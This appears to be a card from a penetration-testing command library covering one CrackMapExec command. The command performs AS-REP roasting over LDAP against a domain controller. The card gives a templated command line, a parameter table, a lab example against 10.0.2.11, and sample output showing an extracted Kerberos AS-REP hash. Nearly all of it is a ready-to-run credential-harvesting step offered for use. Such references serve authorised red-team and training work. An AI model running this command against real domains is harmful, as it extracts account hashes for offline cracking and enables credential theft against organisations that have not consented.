---
id: e0675504-e68e-46bd-9073-51cf1773cf5b
name: crackmapexec-ldap-asreproast
type: command
executor: bash
data: >-
  crackmapexec ldap $_TARGET_IP -u $_USERNAME -p $_PASSWORD --kdcHost $_KDC_IP
  --asreproast $_OUTPUT_FILE
output: null
created_at: '2023-04-06T03:56:30.721521+00:00'
updated_at: '2023-04-10T20:38:03.882727+00:00'
platforms:
  - Linux
  - Windows
tags:
  - ldap
  - as-rep
verified: true
validated: true
---

# crackmapexec-ldap-asreproast

## Command

```bash
crackmapexec ldap $_TARGET_IP -u $_USERNAME -p $_PASSWORD --kdcHost $_KDC_IP --asreproast $_OUTPUT_FILE
```

## Description

Uses CrackMapExec to perform AS-REP roasting over LDAP, extracting hashes from the domain controller.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ldap $_TARGET_IP | Target DC IP | Yes |
| -u $_USERNAME | Username | Yes |
| -p $_PASSWORD | Password | Yes |
| --kdcHost $_KDC_IP | KDC IP | Yes |
| --asreproast $_OUTPUT_FILE | Output file for hashes | Yes |

## Examples

### Basic Usage

```bash
crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
```

## Expected Output

LDAP 10.0.2.11 389 dc01 $krb5asrep$23$john.doe@LAB.LOCAL:hash_value

## Related

- [[procedures/Kerberos-AS-REP-Roasting-Attack]]
- [[tools/CrackMapExec]]
